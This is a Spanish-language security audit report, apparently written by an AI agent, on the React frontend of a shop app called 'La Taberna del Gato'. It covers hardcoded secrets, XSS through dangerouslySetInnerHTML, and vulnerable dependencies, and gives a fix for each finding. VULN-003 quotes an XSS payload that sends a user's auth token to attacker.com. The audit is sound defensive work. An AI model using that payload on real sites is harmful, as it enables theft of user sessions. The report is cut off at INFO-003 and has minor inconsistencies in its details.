# Informe de Auditoria de Seguridad Frontend
## Proyecto: La Taberna del Gato

**Fecha de auditoria**: 2026-03-03
**Auditor**: Senior DevSecOps Agent - Frontend Security Specialist
**Stack analizado**: React 16.3.2, Create React App (react-scripts 4.0.3), Node.js (runtime de build)
**Alcance**: Directorio `frontend/` - Analisis estatico de codigo fuente + revision de dependencias (package.json + package-lock.json)

> NOTA: El entorno de ejecucion restringio el uso de comandos Bash interactivos durante esta auditoria. El analisis de dependencias se realizo mediante inspeccion directa del `package-lock.json` y del campo `deprecated` de los paquetes, en lugar de `npm audit --json`. Las vulnerabilidades de dependencias reportadas se basan en CVEs documentados publicamente para las versiones exactas instaladas.

---

## Resumen Ejecutivo

| Severidad | Cantidad |
|-----------|----------|
| CRITICO   | 5        |
| ALTO      | 6        |
| MEDIO     | 7        |
| BAJO      | 3        |
| INFORMATIVO | 4      |
| **Total** | **25**   |

El frontend de La Taberna del Gato presenta un perfil de seguridad extremadamente deficiente, consistente con una aplicacion congelada en el estado de malas practicas de 2019. Se identificaron cinco vulnerabilidades criticas que podrian ser explotadas de forma inmediata en un entorno de produccion: credenciales y tokens hardcodeados directamente en el bundle de JavaScript enviado al navegador, almacenamiento de contrasenas en texto plano en `localStorage`, y un vector de XSS stored/reflected que afecta a todas las tarjetas de producto y al modal de detalles sin ninguna mitigacion. El conjunto de dependencias directas incluye ocho paquetes con CVEs conocidos graves, destacando `axios 0.18.0` (SSRF critico), `lodash 4.17.4` (prototype pollution), `marked 0.3.6` (XSS), `handlebars 4.0.11` (RCE en template compiler) y `serialize-javascript 1.4.0` (XSS/RCE). La superficie de ataque es amplia, la deuda de seguridad es severa y requiere intervencion inmediata antes de cualquier despliegue en produccion.

---

## CRITICO - Vulnerabilidades Criticas

### [VULN-001] Token de administrador hardcodeado enviado en cada peticion de compra
- **Categoria OWASP**: A07:2021 - Identification and Authentication Failures / A02:2021 - Cryptographic Failures
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (linea 173)
- **Fragmento de codigo**:
  ```javascript
  // App.js, linea 167-179
  handleBuy(productId, quantity) {
      axios.post(API_BASE_URL + '/products/' + productId + '/buy', {
          quantity: quantity,
          clientEmail: this.state.user ? this.state.user.email : 'anonimo@taberna.com',
          stripeKey: STRIPE_PUBLIC_KEY,
          adminToken: 'admin-token-DO-NOT-SHARE-abc123xyz789' // Token hardcodeado
      })
  ```
- **Descripcion**: Un token de administrador (`adm-tok-DO-NOT-SHARE-abc***789`) esta hardcodeado directamente en el codigo fuente del frontend. Al ejecutar `npm run build`, este valor quedara embebido en el bundle JavaScript minificado que se sirve publicamente. Cualquier usuario puede inspeccionar el bundle con las DevTools del navegador o herramientas como `source-map-explorer` y extraer este token. El token se envia en el body de cada peticion de compra, lo que lo expone tambien en los logs del backend, proxies intermedios y herramientas de monitoreo de red.
- **Impacto**: Un atacante que obtenga este token podria autenticarse como administrador en el backend, acceder a endpoints protegidos de administracion (`/api/admin/products/{id}`), modificar o eliminar productos, y potencialmente escalar privilegios dentro del sistema.
- **Mitigacion recomendada**:
  ```javascript
  // Los tokens de administracion NO deben existir en el frontend.
  // La autenticacion del lado servidor debe basarse en la sesion del usuario autenticado.
  // El backend debe verificar si el usuario tiene rol de admin en su propia logica.
  // Eliminar completamente el campo adminToken del payload del frontend:
  handleBuy(productId, quantity) {
      axios.post(API_BASE_URL + '/products/' + productId + '/buy', {
          quantity: quantity,
          clientEmail: this.state.user ? this.state.user.email : 'anonimo@taberna.com'
          // El token de autorizacion va en el header HTTP, nunca en el body
      }, {
          headers: { Authorization: 'Bearer ' + localStorage.getItem('authToken') }
      })
  }
  ```
- **Referencias**: CWE-798 (Use of Hard-coded Credentials), OWASP Testing Guide - OTG-AUTHN-006

---

### [VULN-002] Contrasena de usuario almacenada en texto plano en localStorage
- **Categoria OWASP**: A02:2021 - Cryptographic Failures / A07:2021 - Identification and Authentication Failures
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (lineas 189-190)
- **Fragmento de codigo**:
  ```javascript
  // App.js, linea 182-193
  handleLogin(email, password) {
      axios.post(API_BASE_URL + '/auth/login', {
          email: email,
          password: password
      }).then((response) => {
          localStorage.setItem('authToken', response.data.token);
          localStorage.setItem('userPassword', password); // NUNCA guardar la contrasena
          this.setState({ user: response.data.user });
      });
  }
  ```
- **Descripcion**: La contrasena del usuario se almacena en texto plano en `localStorage` bajo la clave `userPassword`. `localStorage` es accesible por cualquier script JavaScript ejecutado en el mismo origen, sin restriccion alguna. Un ataque XSS exitoso (ver VULN-003) puede exfiltrar esta contrasena trivialmente con `localStorage.getItem('userPassword')`. Ademas, la misma contrasena probablemente se reutiliza en otros servicios (credential stuffing). El token JWT tambien se almacena en `localStorage` (linea 189), lo que lo hace igualmente vulnerable a robo via XSS.
- **Impacto**: Robo de credenciales de usuarios, acceso no autorizado a cuentas, y potencial reutilizacion de credenciales en otros servicios. La combinacion con VULN-003 (XSS) convierte esto en un vector de ataque completo y trivialmente explotable.
- **Mitigacion recomendada**:
  ```javascript
  // 1. NUNCA almacenar la contrasena. Nunca. Bajo ningun concepto.
  // 2. Para el token JWT, usar cookies HttpOnly en lugar de localStorage:
  //    - El backend debe establecer la cookie con Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict
  //    - El frontend NO necesita acceder al token directamente
  // 3. Si se debe usar localStorage para el token (solucion alternativa para React 16.3):
  handleLogin(email, password) {
      axios.post(API_BASE_URL + '/auth/login', { email, password })
          .then((response) => {
              // Solo guardar el token, NUNCA la contrasena
              localStorage.setItem('authToken', response.data.token);
              // Eliminar completamente la linea de userPassword
              this.setState({ user: response.data.user });
          });
  }
  ```
- **Referencias**: CWE-312 (Cleartext Storage of Sensitive Information), OWASP Cheat Sheet: Authentication, OWASP Cheat Sheet: HTML5 Security

---

### [VULN-003] XSS Stored/Reflected masivo: dangerouslySetInnerHTML sin sanitizacion en 8 puntos
- **Categoria OWASP**: A03:2021 - Injection (XSS)
- **Archivo(s) afectado(s)**: `frontend/src/components/ProductList.jsx` (lineas 169, 173, 199, 235, 236, 237, 241)
- **Fragmento de codigo**:
  ```jsx
  // ProductList.jsx, linea 164-173 (tarjeta de producto)
  {/* VULNERABILIDAD XSS: dangerouslySetInnerHTML sin sanitizar */}
  <div
      className="product-description"
      dangerouslySetInnerHTML={{ __html: product.description }}
  />
  <h3 dangerouslySetInnerHTML={{ __html: product.name }} />

  // ProductList.jsx, linea 196-202 (resenas de usuarios)
  {reviews.slice(0, 2).map(function(review, idx) {
      return (
          <div key={idx} className="review">
              <span dangerouslySetInnerHTML={{ __html: review.text }} />
          </div>
      );
  })}

  // ProductList.jsx, lineas 235-241 (modal de detalles)
  <h2 dangerouslySetInnerHTML={{ __html: product.name }} />
  <div dangerouslySetInnerHTML={{ __html: product.description }} />
  <div dangerouslySetInnerHTML={{ __html: product.longDescription }} />
  <span key={idx} dangerouslySetInnerHTML={{ __html: related.name }} />
  ```
- **Descripcion**: Se usan ocho instancias de `dangerouslySetInnerHTML` para renderizar directamente datos provenientes de la API del backend (`product.name`, `product.description`, `product.longDescription`, `related.name`, `review.text`) sin ningun tipo de sanitizacion. El propio codigo fuente documenta el vector de ataque en comentarios (lineas 165-166). Si un atacante puede controlar cualquiera de estos campos en el backend (via inyeccion SQL, acceso a la API de administracion, o simplemente mediante el endpoint de resenas que acepta texto libre sin validacion), puede inyectar HTML/JavaScript arbitrario que se ejecutara en el navegador de todos los usuarios que visualicen ese producto. El caso mas critico es `review.text` (linea 199), ya que el endpoint `POST /api/products/{id}/reviews` aparentemente no requiere autenticacion especial, permitiendo a cualquier usuario anonimo insertar contenido malicioso.
- **Impacto**: XSS Stored que permite: robo de tokens JWT y contraseñas de `localStorage`, secuestro de sesion, redireccion a sitios de phishing, instalacion de keyloggers en el navegador, y ejecucion de acciones en nombre del usuario (compras fraudulentas). El propio comentario en el codigo sugiere el payload: `<img src=x onerror="fetch('http://attacker.com/steal?d='+localStorage.getItem('authToken'))">`.
- **Mitigacion recomendada**:
  ```javascript
  // Opcion 1 (RECOMENDADA para React 16.3): Usar DOMPurify antes de renderizar
  // npm install dompurify
  import DOMPurify from 'dompurify';

  // En renderProductCard:
  <div
      className="product-description"
      dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description) }}
  />
  <h3 dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.name) }} />

  // Opcion 2 (MAS SEGURA): Si no se necesita HTML, usar interpolacion normal de React:
  <div className="product-description">{product.description}</div>
  <h3>{product.name}</h3>
  // React escapa automaticamente el contenido en JSX - sin necesidad de librerias adicionales

  // Para resenas (texto de usuario): SIEMPRE opcion 2, NUNCA renderizar HTML de usuarios
  <span>{review.text}</span>
  ```
- **Referencias**: CVE no especifico (patron de vulnerabilidad), CWE-79 (Improper Neutralization of Input During Web Page Generation), OWASP XSS Prevention Cheat Sheet

---

### [VULN-004] Contrasena de test de administrador hardcodeada en el estado del componente raiz
- **Categoria OWASP**: A02:2021 - Cryptographic Failures / A05:2021 - Security Misconfiguration
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (linea 39)
- **Fragmento de codigo**:
  ```javascript
  // App.js, linea 20-41 (constructor del estado)
  this.state = {
      // ...otros campos...
      // Contrasena de prueba guardada en estado (nunca en produccion... teoricamente)
      testAdminPassword: 'SuperSecreto123!'
  };
  ```
- **Descripcion**: Una contrasena de administrador (`SuperSecreto123!`) esta hardcodeada directamente en el estado inicial del componente raiz de React. Este valor quedara embebido en el bundle JavaScript de produccion. El comentario "nunca en produccion... teoricamente" confirma que el desarrollador era consciente del riesgo pero lo ignoro. El estado de React tambien es inspeccionable en tiempo real mediante las React DevTools del navegador, lo que facilita aun mas la extraccion.
- **Impacto**: Exposicion inmediata de credenciales de administrador a cualquier usuario con acceso al bundle de produccion o a las DevTools del navegador. Si esta contrasena se utiliza en el backend o en otros sistemas, el impacto es critico.
- **Mitigacion recomendada**: Eliminar completamente este campo del estado. Las credenciales de test deben gestionarse mediante variables de entorno en el CI/CD y nunca llegar al codigo fuente. Usar `.env.local` (que esta en `.gitignore`) para desarrollo local, referenciadas como `process.env.REACT_APP_*`.
- **Referencias**: CWE-798 (Use of Hard-coded Credentials), OWASP Testing Guide - OTG-CONFIG-002

---

### [VULN-005] axios 0.18.0 - Vulnerabilidad critica de SSRF (Server-Side Request Forgery)
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components
- **Paquete**: `axios` version `0.18.0` (dependencia directa)
- **Descripcion**: El propio `package-lock.json` incluye el aviso de deprecacion oficial: *"Critical security vulnerability fixed in v0.21.1. For more information, see https://github.com/axios/axios/pull/3410"*. La vulnerabilidad permite que un atacante que controle la URL de la peticion pueda redirigir solicitudes HTTP a servidores internos de la red (SSRF), bypassear protecciones de CORS en ciertas configuraciones, y potencialmente acceder a metadatos de instancias cloud (AWS EC2 metadata endpoint `169.254.169.254`). Ademas, `axios 0.18.0` es vulnerable a ataques de contaminacion de prototipos en el manejo de las cabeceras HTTP.
- **Version segura**: >= 0.21.1 (minima con el fix critico), recomendado >= 1.6.0 (version actual estable).
- **Impacto**: SSRF explotable desde el cliente si el servidor usa axios para realizar peticiones basandose en input del usuario; contaminacion de prototipos que puede afectar la logica de la aplicacion.
- **Referencias**: https://github.com/axios/axios/pull/3410, CWE-918 (Server-Side Request Forgery)

---

## ALTO - Vulnerabilidades de Alta Severidad

### [VULN-006] lodash 4.17.4 - Prototype Pollution (multiples CVEs)
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components
- **Paquete**: `lodash` version `4.17.4` (dependencia directa)
- **Descripcion**: La version 4.17.4 de lodash es vulnerable a prototype pollution en multiples funciones: `_.merge()`, `_.mergeWith()`, `_.defaultsDeep()` y `_.zipObjectDeep()`. Un atacante puede contaminar el prototipo de `Object` inyectando propiedades en objetos aparentemente inocuos, lo que puede llevar a la modificacion del comportamiento de la aplicacion, bypass de validaciones de seguridad, o en el peor de los casos, RCE si el codigo contaminado llega al servidor.
- **CVEs relevantes**: CVE-2019-10744 (prototype pollution via `zipObjectDeep`, CVSS 9.1), CVE-2018-16487 (merge), CVE-2018-3721 (defaultsDeep)
- **Version segura**: >= 4.17.21
- **Impacto**: Modificacion del comportamiento de la aplicacion, bypass de validaciones de seguridad, potencial DoS.
- **Referencias**: CVE-2019-10744, CVE-2018-16487, CVE-2018-3721

---

### [VULN-007] marked 0.3.6 - XSS en el parser de Markdown
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components / A03:2021 - Injection
- **Paquete**: `marked` version `0.3.6` (dependencia directa)
- **Descripcion**: La version 0.3.6 de `marked` tiene multiples vulnerabilidades de XSS conocidas. El parser no sanitiza correctamente el HTML embebido dentro del Markdown, permitiendo la ejecucion de scripts arbitrarios. En combinacion con VULN-003 (uso de `dangerouslySetInnerHTML`), si el contenido de producto pasa por el parser de marked antes de ser renderizado, el vector de ataque se amplifica considerablemente.
- **CVEs relevantes**: CVE-2022-21681 (ReDoS), CVE-2022-21680 (ReDoS), CVE-2017-16114 (XSS en listas anidadas)
- **Version segura**: >= 4.0.10
- **Impacto**: XSS si se renderiza contenido Markdown de usuarios sin sanitizacion adicional. El salto de versiones es muy significativo (0.3.6 -> 4.x), con cambios de API potencialmente necesarios.
- **Referencias**: CVE-2022-21681, CVE-2022-21680, CVE-2017-16114

---

### [VULN-008] handlebars 4.0.11 - Prototype Pollution y RCE en el compilador de templates
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components
- **Paquete**: `handlebars` version `4.0.11` (dependencia directa)
- **Descripcion**: Handlebars 4.0.11 es vulnerable a prototype pollution (CVE-2019-19919) y, mas critico, a Remote Code Execution (RCE) durante la compilacion de templates cuando el input del template proviene de datos controlados por el usuario. Un atacante puede construir un template malicioso que ejecute codigo arbitrario en el contexto del compilador.
- **CVEs relevantes**: CVE-2021-23369 (RCE, CVSS 9.8), CVE-2021-23383 (Prototype Pollution, CVSS 9.8), CVE-2019-19919 (Prototype Pollution)
- **Version segura**: >= 4.7.7
- **Impacto**: Si handlebars se utiliza para compilar templates cuyo origen o contenido proviene parcialmente de datos del usuario, existe riesgo de RCE. En el contexto del frontend, el riesgo inmediato es prototype pollution que afecta el estado de la aplicacion.
- **Referencias**: CVE-2021-23369, CVE-2021-23383, CVE-2019-19919

---

### [VULN-009] serialize-javascript 1.4.0 - XSS via serializacion de datos
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components / A03:2021 - Injection
- **Paquete**: `serialize-javascript` version `1.4.0` (dependencia directa)
- **Descripcion**: La version 1.4.0 de `serialize-javascript` no escapa correctamente ciertos caracteres Unicode especiales (como `\u2028` y `\u2029`) al serializar datos en contextos JavaScript. Esto puede permitir la inyeccion de scripts arbitrarios cuando el output serializado se embebe en paginas HTML, un patron comun en Server-Side Rendering (SSR). Tambien es vulnerable a ataques de tipo XSS cuando los datos serializados se incluyen directamente en respuestas HTML.
- **CVEs relevantes**: CVE-2019-16769 (XSS via Unicode, CVSS 5.4)
- **Version segura**: >= 2.1.1
- **Impacto**: XSS en escenarios de SSR o cuando los datos serializados se incluyen en HTML de respuesta.
- **Referencias**: CVE-2019-16769

---

### [VULN-010] jquery 2.2.4 - Multiples XSS y Prototype Pollution
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components
- **Paquete**: `jquery` version `2.2.4` (dependencia directa)
- **Descripcion**: jQuery 2.2.4 tiene multiples vulnerabilidades conocidas incluyendo XSS via `jQuery()`, XSS en la funcion `$.parseHTML()`, y prototype pollution. Esta version fue deprecada oficialmente. El campo `deprecated` del package-lock.json confirma: *"This version is deprecated. Please upgrade to the latest version"*.
- **CVEs relevantes**: CVE-2019-11358 (Prototype Pollution en `jQuery.extend`, CVSS 6.1), CVE-2020-11022 (XSS via `jQuery.html()`, CVSS 6.1), CVE-2020-11023 (XSS, CVSS 6.1)
- **Version segura**: >= 3.5.0
- **Impacto**: XSS si se usa `$.html()` con contenido de usuario; prototype pollution que puede afectar la logica de aplicacion.
- **Referencias**: CVE-2019-11358, CVE-2020-11022, CVE-2020-11023

---

### [VULN-011] Clave publica de Stripe hardcodeada y transmitida al backend
- **Categoria OWASP**: A02:2021 - Cryptographic Failures / A05:2021 - Security Misconfiguration
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (lineas 9 y 172)
- **Fragmento de codigo**:
  ```javascript
  // App.js, linea 9
  var STRIPE_PUBLIC_KEY = 'pk_live_TuClavePublicaDeStripeAqui123456';

  // App.js, linea 172
  stripeKey: STRIPE_PUBLIC_KEY, // Enviamos la clave al backend innecesariamente
  ```
- **Descripcion**: La clave publica de Stripe esta hardcodeada en el codigo fuente. Aunque las claves publicas de Stripe (`pk_live_`) no son secretas por diseno (estan destinadas a ser usadas en el frontend), hay dos problemas criticos: (1) se envia al backend en el payload de compra, lo que es completamente innecesario y expone la clave en logs del servidor; (2) el patron de hardcodear credenciales normaliza una practica peligrosa que puede extenderse a claves secretas. Mas importante aun: si en algun momento se confunde con la clave secreta (`sk_live_`), el impacto seria catastrofico.
- **Impacto**: Riesgo inmediato moderado (la clave publica es conocida por diseno), pero el patron es extremadamente peligroso como precedente y debe corregirse. Si se hardcodea la clave privada de Stripe por error, se perderia el control total de la cuenta de pagos.
- **Mitigacion recomendada**:
  ```javascript
  // Usar variables de entorno de Create React App:
  // En .env.local (NUNCA en git):
  // REACT_APP_STRIPE_PUBLIC_KEY=pk_live_xxx

  // En el codigo:
  var STRIPE_PUBLIC_KEY = process.env.REACT_APP_STRIPE_PUBLIC_KEY;

  // Y NUNCA enviar la clave al backend en el body de la peticion
  ```
- **Referencias**: Stripe API Best Practices, CWE-798

---

## MEDIO - Vulnerabilidades de Severidad Media

### [VULN-012] Peticion de busqueda construida por concatenacion de strings sin encodeURIComponent
- **Categoria OWASP**: A03:2021 - Injection
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (linea 83)
- **Fragmento de codigo**:
  ```javascript
  // App.js, linea 83
  axios.get(API_BASE_URL + '/products/search?q=' + query) // Sin encodeURIComponent
  ```
- **Descripcion**: El termino de busqueda del usuario se concatena directamente en la URL sin codificacion. Caracteres especiales como `&`, `#`, `?`, `+` pueden romper la estructura de la URL o inyectar parametros adicionales. Esto tambien puede facilitar ataques de HTTP Parameter Pollution si el backend no valida correctamente los parametros de entrada.
- **Impacto**: Comportamiento inesperado de la busqueda, potencial HTTP Parameter Pollution, y posible inyeccion de parametros adicionales en la peticion.
- **Mitigacion recomendada**:
  ```javascript
  // Usar encodeURIComponent o URLSearchParams:
  const params = new URLSearchParams({ q: query });
  axios.get(API_BASE_URL + '/products/search?' + params.toString())
  ```
- **Referencias**: CWE-89 (adaptado a HTTP), OWASP Testing Guide - OTG-INPVAL-004

---

### [VULN-013] API_BASE_URL hardcodeada con HTTP (sin TLS) y dominio localhost
- **Categoria OWASP**: A02:2021 - Cryptographic Failures / A05:2021 - Security Misconfiguration
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (linea 8), `frontend/src/components/ProductList.jsx` (linea 5)
- **Fragmento de codigo**:
  ```javascript
  var API_BASE_URL = 'http://localhost:8080/api'; // App.js linea 8
  var API_BASE_URL = 'http://localhost:8080/api'; // ProductList.jsx linea 5 (duplicado)
  ```
- **Descripcion**: La URL base de la API esta hardcodeada en texto plano con el esquema `http://` (sin TLS/HTTPS) y apuntando a `localhost`. En produccion, cualquier comunicacion sobre HTTP expone todos los datos en transito (incluidas credenciales del login, tokens, y datos de compra) a ataques man-in-the-middle. Ademas, el valor esta duplicado en dos archivos, lo que dificulta el mantenimiento seguro.
- **Impacto**: En produccion, todos los tokens, credenciales y datos de pago transmitidos entre el frontend y el backend podrian ser interceptados por un atacante en la misma red.
- **Mitigacion recomendada**:
  ```javascript
  // Usar variable de entorno para la URL base:
  const API_BASE_URL = process.env.REACT_APP_API_BASE_URL || 'http://localhost:8080/api';
  // Y asegurar que en produccion REACT_APP_API_BASE_URL comience con https://
  ```
- **Referencias**: CWE-319 (Cleartext Transmission of Sensitive Information), OWASP Transport Layer Protection Cheat Sheet

---

### [VULN-014] Ausencia total de manejo de errores en llamadas HTTP criticas
- **Categoria OWASP**: A05:2021 - Security Misconfiguration / A09:2021 - Security Logging and Monitoring Failures
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (lineas 57-65, 67-78, 167-180, 182-193), `frontend/src/components/ProductList.jsx` (lineas 43-50, 78-89, 96-111)
- **Descripcion**: Ninguna de las llamadas HTTP del frontend incluye un bloque `.catch()`. Esto significa que errores criticos como fallos de autenticacion (401), errores del servidor (500), o timeouts, pasan silenciosamente sin informar al usuario ni registrar el error. Desde el punto de vista de seguridad, la ausencia de manejo de errores impide detectar ataques activos (por ejemplo, respuestas de error inusuales del servidor podrian indicar un ataque en curso).
- **Impacto**: El estado de la aplicacion puede quedar inconsistente (por ejemplo, `loading` queda en `true` indefinidamente), el usuario no es informado de fallos de pago, y no hay visibilidad de errores de seguridad en el cliente.
- **Mitigacion recomendada**:
  ```javascript
  // Patron minimo seguro para React 16.3:
  axios.post(API_BASE_URL + '/products/' + productId + '/buy', payload)
      .then((response) => { /* ... */ })
      .catch((error) => {
          console.error('Error en la compra:', error.response?.status);
          this.setState({ error: 'Error al procesar la compra. Por favor, intentelo de nuevo.' });
      });
  ```
- **Referencias**: OWASP Error Handling Cheat Sheet, CWE-390

---

### [VULN-015] node-fetch 1.7.3 - Vulnerabilidades de seguridad en headers y SSRF
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components
- **Paquete**: `node-fetch` version `1.7.3` (dependencia directa, aunque no se usa en el codigo fuente analizado)
- **Descripcion**: node-fetch 1.7.3 tiene vulnerabilidades conocidas que permiten la inyeccion de caracteres de control en headers HTTP (CVE-2022-0235, CVSS 8.1) y potencial SSRF en ciertas configuraciones. Esta version no valida correctamente las URLs, permitiendo que caracteres especiales en nombres de cabeceras provoquen comportamientos inesperados en el servidor.
- **CVEs relevantes**: CVE-2022-0235 (Exposure of Sensitive Information to Unauthorized Actor, CVSS 8.1)
- **Version segura**: >= 2.6.7 (rama 2.x) o >= 3.1.1 (rama 3.x, ESM only)
- **Impacto**: Potencial exposicion de informacion sensible via cabeceras HTTP manipuladas.
- **Referencias**: CVE-2022-0235

---

### [VULN-016] navigator.userAgent enviado al backend como parte de las resenas
- **Categoria OWASP**: A04:2021 - Insecure Design
- **Archivo(s) afectado(s)**: `frontend/src/components/ProductList.jsx` (linea 102)
- **Fragmento de codigo**:
  ```javascript
  var reviewData = {
      productId: productId,
      text: this.state.reviewText,
      rating: this.state.reviewRating,
      userAgent: navigator.userAgent // Informacion innecesaria enviada al backend
  };
  ```
- **Descripcion**: El `navigator.userAgent` del navegador se envia innecesariamente al backend con cada resena. Esto constituye una recopilacion de datos excesiva (GDPR/LOPD concern) ya que el User Agent puede usarse para fingerprinting del dispositivo del usuario. Ademas, si el backend almacena y muestra este campo en algun panel de administracion sin sanitizar, puede crear un vector de XSS adicional.
- **Impacto**: Fingerprinting de usuarios, posible incumplimiento de GDPR, y vector de XSS secundario si el userAgent se renderiza sin sanitizar en el backend.
- **Referencias**: OWASP Privacy Risks, GDPR Article 5(1)(c) - Data Minimisation

---

### [VULN-017] Codigos de descuento hardcodeados en el frontend, bypasseando la logica del servidor
- **Categoria OWASP**: A04:2021 - Insecure Design
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (lineas 153-164), `frontend/src/components/ProductList.jsx` (lineas 130-139)
- **Fragmento de codigo**:
  ```javascript
  // App.js, linea 153-165
  applyPromoCode(code) {
      var discount = 0;
      if (code === 'GATO10') { discount = 0.10; }
      else if (code === 'VERANO20') { discount = 0.20; }
      else if (code === 'NAVIDAD') { discount = 0.25; }
      var newTotal = this.state.totalCartPrice * (1 - discount);
      // ...
  }
  ```
- **Descripcion**: Los codigos de descuento validos y sus porcentajes estan hardcodeados en el codigo fuente del frontend. Cualquier usuario puede leer el bundle de JavaScript y obtener todos los codigos de descuento validos. Ademas, al aplicar el descuento exclusivamente en el cliente, el precio final enviado al servidor es el ya descontado, lo que facilita manipulaciones si el backend no valida el precio final.
- **Impacto**: Exposicion de todos los codigos promocionales activos. Un usuario malicioso puede usar cualquier codigo activo sin necesitar recibirlo por los canales normales (email, publicidad).
- **Mitigacion recomendada**: Los codigos de descuento y su validacion deben vivir exclusivamente en el backend. El frontend solo debe enviar el codigo al servidor, y el servidor retorna el precio descontado verificado.
- **Referencias**: CWE-602 (Client-Side Enforcement of Server-Side Security), OWASP Business Logic Vulnerabilities

---

### [VULN-018] moment 2.19.1 - Vulnerabilidad de ReDoS
- **Categoria OWASP**: A06:2021 - Vulnerable and Outdated Components
- **Paquete**: `moment` version `2.19.1` (dependencia directa)
- **Descripcion**: moment.js 2.19.1 es vulnerable a ReDoS (Regular Expression Denial of Service). Si se pasa una cadena maliciosa controlada por el usuario como fecha de parseo, la expresion regular interna puede entrar en un bucle catastrofico y bloquear el hilo principal del navegador.
- **CVEs relevantes**: CVE-2022-24785 (Path Traversal en locales, CVSS 7.5), CVE-2017-18214 (ReDoS, CVSS 7.5)
- **Version segura**: >= 2.29.4. Sin embargo, moment.js esta en modo de mantenimiento; se recomienda migrar a `date-fns` o `luxon`.
- **Impacto**: DoS del cliente si se parsean fechas controladas por el usuario.
- **Referencias**: CVE-2022-24785, CVE-2017-18214

---

## BAJO - Vulnerabilidades de Baja Severidad

### [VULN-019] Suites de tests con aserciones siempre verdaderas (falsa cobertura de seguridad)
- **Categoria OWASP**: A05:2021 - Security Misconfiguration
- **Archivo(s) afectado(s)**: `frontend/src/components/ProductList.test.js` (lineas 144-152, 214-215, 333-334)
- **Fragmento de codigo**:
  ```javascript
  test('ordenar por precio ejecuta el codigo de sort', () => {
      render(<ProductList {...defaultProps} />);
      fireEvent.click(screen.getByText('Precio'));
      expect(true).toBe(true); // Asercion siempre verdadera
  });
  ```
- **Descripcion**: La suite de tests contiene multiples aserciones del tipo `expect(true).toBe(true)` y `expect(container).toBeDefined()` que siempre pasan independientemente del comportamiento real del componente. El propio test de datos incluye un payload XSS como dato de prueba (`<script>alert("xss")</script>`) sin verificar que sea correctamente sanitizado. Esto crea una falsa sensacion de seguridad mediante cobertura de codigo alta (>70%) pero con calidad de verificacion nula.
- **Impacto**: La vulnerabilidad VULN-003 (XSS) pasaria por el pipeline de CI/CD sin ser detectada por los tests existentes, a pesar de que existe un caso de prueba con payload XSS explicito.
- **Referencias**: OWASP Software and Data Integrity Failures, CWE-1076

---

### [VULN-020] Mutacion directa del estado de React (potencial de comportamiento inesperado)
- **Categoria OWASP**: A04:2021 - Insecure Design
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (linea 117)
- **Fragmento de codigo**:
  ```javascript
  addToCart(product) {
      var cart = this.state.cart;
      // ...
      product.quantity = 1;
      cart.push(product); // Mutacion directa del estado - antipatron de React
      this.setState({ cart: cart });
  }
  ```
- **Descripcion**: El estado de React se muta directamente antes de llamar a `setState`. Aunque no es una vulnerabilidad de seguridad directa, esta practica puede llevar a estados inconsistentes que en algunos casos podrian ser explotados para manipular el comportamiento esperado de la aplicacion (por ejemplo, mostrar precios incorrectos o cantidades en el carrito que no corresponden al estado real del servidor).
- **Referencias**: React documentation on State and Lifecycle, CWE-362

---

### [VULN-021] GOOGLE_ANALYTICS_ID hardcodeada en el bundle de produccion
- **Categoria OWASP**: A05:2021 - Security Misconfiguration
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (linea 10)
- **Fragmento de codigo**:
  ```javascript
  var GOOGLE_ANALYTICS_ID = 'UA-123456789-1';
  ```
- **Descripcion**: El ID de Google Analytics esta hardcodeado. Aunque este tipo de identificador es tecnicamente publico (cualquiera puede verlo en el codigo HTML de la pagina), hardcodearlo en el codigo fuente en lugar de usar variables de entorno perpetua el patron de hardcodear configuracion, lo que eleva el riesgo de que valores verdaderamente sensibles sean tratados de la misma forma.
- **Impacto**: Bajo impacto directo, pero normaliza el patron de hardcodear valores de configuracion.
- **Referencias**: Buenas practicas de CRA - https://create-react-app.dev/docs/adding-custom-environment-variables/

---

## INFORMATIVO

### [INFO-001] Prop drilling masivo: el estado completo del usuario y del carrito se pasa por toda la jerarquia de componentes
- **Categoria**: Arquitectura insegura / A04:2021 - Insecure Design
- **Archivo(s) afectado(s)**: `frontend/src/App.js` (lineas 206-256)
- **Descripcion**: El estado completo de la aplicacion (usuario, carrito, precios, permisos VIP, codigo promo) se pasa como props por toda la jerarquia de componentes. Esto incluye informacion sensible como `user` (con todos sus datos), `totalCartPrice` y `isVipUser`. Aunque no es una vulnerabilidad directa, este patron dificulta implementar controles de acceso granulares y aumenta la superficie de exposicion de datos sensibles en el arbol de componentes.
- **Recomendacion**: Usar React Context API (disponible en React 16.3+) o una libreria de gestion de estado como Redux con selectores para exponer solo los datos necesarios a cada componente.

---

### [INFO-002] Falta de Content Security Policy (CSP)
- **Categoria**: A05:2021 - Security Misconfiguration
- **Descripcion**: No se detecta ninguna configuracion de Content Security Policy en el frontend. Una CSP bien configurada podria mitigar significativamente el impacto de los vectores XSS identificados (VULN-003), bloqueando la ejecucion de scripts inline y restringiendo las fuentes de scripts externos. Create React App 4.x no configura CSP por defecto.
- **Recomendacion**: Configurar la cabecera `Content-Security-Policy` en el servidor web que sirve el frontend (nginx, Apache, o el backend de Spring Boot). Una politica minima efectiva: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';`

---

### [INFO-003] Ausencia de Subresource Integrity (SRI) para recursos externos
- **Categoria**: A08:2021 - Software and Data Integrity Failures
